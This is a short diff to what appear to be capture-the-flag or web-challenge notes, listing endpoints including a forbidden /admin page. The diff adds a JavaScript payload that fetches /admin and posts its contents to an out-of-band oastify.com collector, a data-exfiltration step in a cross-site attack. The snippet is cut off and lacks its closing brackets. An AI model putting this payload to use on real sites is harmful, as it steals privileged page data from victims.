@@ -54,7 +54,20 @@ __Endpoints__
 - /bugs
 - /admin - 403
 
-
+```javascript
+fetch('/admin')
+  .then(function(response) {
+    return response.text();
+  })
+  .then(function(data) {
+    fetch('https://t0uxr3i4vnt66ewlzppa5t6xhonlba.oastify.com/send', {
+      method: 'POST',
+      body: JSON.stringify(data),
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    })
+```
 
 ---
 ### Ping Pong
